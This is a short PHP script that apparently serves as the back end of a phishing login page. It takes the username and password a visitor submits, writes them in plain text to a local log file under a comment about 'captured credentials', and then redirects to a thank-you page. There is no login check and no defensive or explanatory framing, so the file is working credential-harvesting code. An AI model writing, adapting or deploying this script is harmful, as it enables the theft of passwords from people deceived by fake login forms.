<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Log the captured credentials to a file
    $log = "Username: $username, Password: $password\n";
    file_put_contents('credentials.log', $log, FILE_APPEND);

    // Redirect to a thank you page
    header("Location: thankyou.html");
    exit();
}
?>
